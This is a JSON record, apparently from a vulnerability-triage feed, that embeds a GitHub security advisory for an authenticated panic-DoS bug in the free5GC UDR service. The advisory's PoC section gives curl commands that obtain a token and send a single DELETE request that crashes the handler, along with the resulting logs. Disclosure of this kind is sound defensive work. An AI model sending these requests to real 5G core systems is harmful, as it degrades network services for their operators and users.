@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/104151270?v=4\", \"events_url\": \"https://api.github.com/users/LinZiyuu/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/LinZiyuu/followers\", \"following_url\": \"https://api.github.com/users/LinZiyuu/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/LinZiyuu/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/LinZiyuu\", \"id\": 104151270, \"login\": \"LinZiyuu\", \"node_id\": \"U_kgDOBjU45g\", \"organizations_url\": \"https://api.github.com/users/LinZiyuu/orgs\", \"received_events_url\": \"https://api.github.com/users/LinZiyuu/received_events\", \"repos_url\": \"https://api.github.com/users/LinZiyuu/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/LinZiyuu/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/LinZiyuu/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/LinZiyuu\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-44324\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-704\", \"name\": \"Incorrect Type Conversion or Cast\"}, {\"cwe_id\": \"CWE-754\", \"name\": \"Improper Check for Unusual or Exceptional Conditions\"}], \"description\": \"### Summary\\nfree5GC's UDR `nudr-dr` `DELETE /subscription-data/{ueId}/{servingPlmnId}/ee-subscriptions/{subsId}/amf-subscriptions` handler panics on a single authenticated request against a fresh UDR instance when the supplied `ueId` does not exist in `UESubsCollection`. The processor checks `value, ok := udrSelf.UESubsCollection.Load(ueId)` and sets a `404 USER_NOT_FOUND` problem-details on the miss path, but execution continues and immediately runs `value.(*udr_context.UESubsData)` -- a Go type assertion on a nil interface, which panics with `interface conversion: interface {} is nil, not *context.UESubsData`. Gin recovery converts the panic into `HTTP 500`, but the endpoint remains repeatedly panicable.\\n\\nThis is the no-precondition sibling of free5gc/free5gc#919: same handler, same bug pattern (set `pd`, do not return, then dereference), but the panic site is the nil-interface type assertion at line 61 instead of the nil-pointer deref at line 69. No earlier EE-subscription create is required.\\n\\nThis endpoint requires a valid `nudr-dr` OAuth2 access token (PR:L, NOT PR:N), so this is scored as an authenticated panic-DoS, not as an unauth-bypass finding.\\n\\n### Details\\nValidated against the UDR container in the official Docker compose lab.\\n- Source repo tag: `v4.2.1`\\n- Running Docker image: `free5gc/udr:v4.2.1`\\n- Runtime UDR commit: `754d23b0`\\n- Docker validation date: 2026-03-22\\n- UDR endpoint: `http://10.100.200.11:8000`\\n\\nVulnerable handler (the `ok` miss path sets `pd` but does not return; the next line type-asserts the nil interface):\\n```go\\nsubsId := c.Params.ByName(\\\"subsId\\\")\\ns.Processor().RemoveAmfSubscriptionsInfoProcedure(c, subsId, ueId)\\n```\\nIn the processor:\\n```go\\nvalue, ok := udrSelf.UESubsCollection.Load(ueId)\\nif !ok {\\n    pd = util.ProblemDetailsNotFound(\\\"USER_NOT_FOUND\\\")\\n}\\n\\nUESubsData := value.(*udr_context.UESubsData)   // panics: nil interface\\n```\\nWhen `ueId` is absent from `UESubsCollection`, `value` is the nil `interface{}` returned by `sync.Map.Load`, and `value.(*udr_context.UESubsData)` panics with:\\n```\\npanic: interface conversion: interface {} is nil, not *context.UESubsData\\n```\\n\\nCode evidence (paths in `free5gc/udr`):\\n- Route exposure + handler dispatch:\\n  - `NFs/udr/internal/sbi/api_datarepository.go:2161`\\n  - `NFs/udr/internal/sbi/api_datarepository.go:2170`\\n  - `NFs/udr/internal/sbi/api_datarepository.go:2172`\\n- Panic root cause (nil interface type assertion):\\n  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:53`\\n  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:56`\\n  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:61`\\n\\n### PoC\\nReproduced end-to-end against the running UDR at `http://10.100.200.11:8000` -- single authenticated request, no preconditions.\\n\\n1. Restart UDR (clean state -- proves no precondition is needed):\\n```\\ndocker restart udr\\n```\\n\\n2. Obtain a valid `nudr-dr` token from NRF:\\n```\\ncurl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \\\\\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\\\\n  --data 'grant_type=client_credentials&nfType=NEF&nfInstanceId=eb9990de-4cd3-41b0-b5d9-c2102b088c57&targetNfType=UDR&scope=nudr-dr'\\n```\\n\\n3. Trigger the panic with one DELETE for a nonexistent `ueId=x`:\\n```\\ncurl -i -sS -X DELETE \\\\\\n  'http://10.100.200.11:8000/nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions' \\\\\\n  -H 'Authorization: Bearer <valid_nudr_dr_jwt>'\\n```\\n```\\nHTTP/1.1 500 Internal Server Error\\nContent-Length: 0\\n```\\n\\n4. UDR container logs (`docker logs udr`) confirm the nil-interface conversion panic at `event_amf_subscription_info_document.go:61` inside `RemoveAmfSubscriptionsInfoProcedure`:\\n```\\n[ERRO][UDR][GIN] panic: interface conversion: interface {} is nil, not *context.UESubsData\\ngithub.com/free5gc/udr/internal/sbi/processor.(*Processor).RemoveAmfSubscriptionsInfoProcedure\\n    .../event_amf_subscription_info_document.go:61\\ngithub.com/free5gc/udr/internal/sbi.(*Server).HandleRemoveAmfSubscriptionsInfo\\n    .../api_datarepository.go:2172\\n[INFO][UDR][GIN] | 500 | DELETE | /nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions |\\n```\\n\\n### Impact\\nIncorrect type conversion on a nil interface (CWE-704) inside an authenticated UDR data-repository handler, caused by improper handling of the missing-ueId branch (CWE-754): the handler sets a `404` problem-details value but does not return, then runs a Go type assertion on the nil interface returned by `sync.Map.Load`.\\n\\nThis is NOT framed as an auth-bypass finding: the endpoint requires a valid `nudr-dr` OAuth2 access token. A network attacker who already holds (or can obtain) a valid token can:\\n- Trigger a reliable, single-request panic on the `amf-subscriptions` delete route against a fresh UDR (no preparatory state needed -- this is strictly easier than free5gc/free5gc#919).\\n- Repeat the trigger to sustain a per-request panic-DoS on UDR's data-repository surface, with each panic costing more CPU + log writes than the intended `404 USER_NOT_FOUND` response would have.\\n\\nNo Confidentiality impact (the response is `500` with empty body). No Integrity impact (the panic happens before any state mutation). Availability impact is limited to per-request degradation (Gin recovers; the UDR process keeps running).\\n\\nAffected: free5gc v4.2.1.\\n\\nUpstream issue: https://github.com/free5gc/free5gc/issues/920\\nUpstream fix: https://github.com/free5gc/udr/pull/60\", \"epss\": {\"percentage\": 0.0042, \"percentile\": 0.3351}, \"ghsa_id\": \"GHSA-jqfc-gwj5-3w63\", \"github_reviewed_at\": \"2026-05-08T22:52:20Z\", \"html_url\": \"https://github.com/advisories/GHSA-jqfc-gwj5-3w63\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-jqfc-gwj5-3w63\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-44324\"}], \"nvd_published_at\": \"2026-05-27T17:16:37Z\", \"published_at\": \"2026-05-08T22:52:20Z\", \"references\": [\"https://github.com/free5gc/free5gc/security/advisories/GHSA-jqfc-gwj5-3w63\", \"https://github.com/free5gc/free5gc/issues/920\", \"https://github.com/free5gc/udr/pull/60\", \"https://github.com/free5gc/udr/commit/8a1d3c63be99d378806d771f086ff32f1867da99\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-44324\", \"https://github.com/advisories/GHSA-jqfc-gwj5-3w63\"], \"repository_advisory_url\": \"https://api.github.com/repos/free5gc/free5gc/security-advisories/GHSA-jqfc-gwj5-3w63\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/free5gc/free5gc\", \"summary\": \"free5GC's UDR nudr-dr DELETE amf-subscriptions panics on missing UE state via nil interface type assertion (single authenticated request)\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T23:48:09Z\", \"url\": \"https://api.github.com/advisories/GHSA-jqfc-gwj5-3w63\", \"vulnerabilities\": [{\"first_patched_version\": \"1.4.3\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/free5gc/udr\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.4.3\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-jqfc-gwj5-3w63",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/free5gc/udr: < 1.4.3"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-44324"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/free5gc/udr"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.036892Z",
+  "provenance": {
+    "content_sha256": "850827edda8530d9716726325ee11dc342b7155756203f46ca275893ae19d2f9",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-08T22:52:20Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-jqfc-gwj5-3w63",
+  "status": "active",
+  "title": "free5GC's UDR nudr-dr DELETE amf-subscriptions panics on missing UE state via nil interface type assertion (single authenticated request)",
+  "updated_at": "2026-06-08T23:48:09Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-jqfc-gwj5-3w63"
+}
